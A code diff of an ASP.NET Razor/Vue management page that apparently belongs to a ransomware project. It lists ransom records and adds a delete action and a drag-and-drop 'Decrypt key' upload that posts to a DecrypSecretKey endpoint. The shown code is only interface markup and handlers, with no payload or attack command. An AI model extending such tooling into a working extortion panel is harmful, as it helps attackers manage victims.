@@ -43,7 +43,7 @@
         </div>
 
         <div class="row">
-            <div class="col-md-12">
+            <div class="col-md-7">
                 <div class="box box-danger" style="background-color:#666">
                     <table class="table" style="color:#fff">
                         <thead>
@@ -56,22 +56,79 @@
                         </thead>
                         <tbody>
                             @foreach (RansomDetailsViewModel record in Model)
-                                {
-                                    <tr>
-                                        <td class="text-center">@record.Name</td>
-                                        <td class="text-center">@record.Description</td>
-                                        <td class="text-center">@record.Date</td>
-                                    </tr>
-                                }
+                            {
+                                <tr>
+                                    <td class="text-center">@record.Name</td>
+                                    <td class="text-center">@record.Description</td>
+                                    <td class="text-center">@record.Date</td>
+                                    <td class="no-padding">
+                                        <div class="margin">
+                                            <div class="btn-group">
+                                                <button class=" btn-danger dropdown-toggle" type="button" data-toggle="dropdown" aria-expanded="false">
+                                                    <span class="caret"></span>
+                                                    <span class="sr-only"></span>
+                                                </button>
+                                                <ul class="dropdown-menu" role="menu">
+                                                    <li>
+                                                        <a href="#" v-on:click="remove(@record.Id)">Delete</a>
+                                                    </li>
+                                                </ul>
+                                            </div>
+                                        </div>
+                                    </td>
+                                </tr>
+                            }
                         </tbody>
                     </table>
+                </div>
+            </div>
+
+            <div class="col-md-5">
+                <div class="box box-danger" style="background-color:#666">
+                    <div class="box-header">
+                        <h4 class="box-title" style="color:#ffff">Decrypt key</h4>
+                    </div>
+                    <div class="box-body">
+                       <div class="small-box bg-gray">
+                           <div class="row">
+                               <div class="col-md-4"></div>
+
+                               <div class="col-md-4">
+                                   <div class="info-box text-center">
+                                       <form  enctype="multipart/form-data">
+                                           <div class="bg-gray  no-margin d-flex justify-content-center" @@dragover="dragover" @@dragleave="dragleave" @@drop="drop">
+
+                                               <input style="display:none" type="file" multiple name="fields" id="assetsFieldHandle"
+                                                      class="w-px h-px opacity-0 overflow-hidden absolute" @@change="onChange" ref="file" accept=".key,.jpg" />
+
+                                               <label for="assetsFieldHandle" class="info-box-icon" style="margin-top:20px; margin-bottom:20px; cursor:pointer">
+                                                   <i class="fa fa-lock"></i>
+                                               </label>
+                                           </div>
+                                       </form>
+                                      
+                                       <span style="color:#666" v-for="file in filecontent">${file.name}</span>
+
+                                   </div>
+                               </div>
+
+                               <div class="col-md-4"></div>
+                           </div>
+
+                           <a class="small-box-footer">Drop secretkey</a>
+                       </div>
+                    </div>
+                    <div class="box-footer no-border" style="background-color:#666">
+                        <button @@click="decryptkey" class="btn btn-xs btn-block btn-primary">Decrypt key</button>
+
+                    </div>
+
                 </div>
             </div>
         </div>
     </div>
 </div>
 
-<script src="~/js/javascript-map.min.js"></script>
 
 @section scripts{
 
@@ -80,15 +137,56 @@
         var dataLst = new Vue({
             el: "#app",
             mixins: [vue_base],
+            delimiters: ['${', '}'],
             data: {
-              
-
+                filecontent:[]
             },
             mounted() {
             },
             methods: {
 
-              
+                decryptkey: function () {
+                    this.post_request('@Url.Action("DecrypSecretKey", "Management")').then(response => {
+
+                    });
+                },
+
+                onChange() {
+                    this.filecontent = [...this.$refs.file.files];
+                    console.log(this.filecontent);
+                },
+
+                dragover(event) {
+                    event.preventDefault();
+                    // Add some visual fluff to show the user can drop its files
+                    if (!event.currentTarget.classList.contains('bg-green-gradient')) {
+                        event.currentTarget.classList.remove('bg-gray');
+                        event.currentTarget.classList.add('bg-green-gradient');
+                    }
+                },
+                dragleave(event) {
+                    // Clean up
+                    event.currentTarget.classList.add('bg-gray');
+                    event.currentTarget.classList.remove('bg-green-gradient');
+                },
+                drop(event) {
+                    event.preventDefault();
+                    this.$refs.file.files = event.dataTransfer.files;
+                    this.onChange(); // Trigger the onChange event manually
+                    // Clean up
+                    event.currentTarget.classList.add('bg-gray');
+                    event.currentTarget.classList.remove('bg-green-gradient');
+                },
+
+                remove: function (id) {
+
+                    this.post_request('@Url.Action("DeleteRansomware", "Management")', id).then(response => {
+                        if (response.data.success !== false) {
+                            //aqui va el mensaje de success
+                            location.reload();
+                        }
+                    });
+                }
             }
         });
     </script>
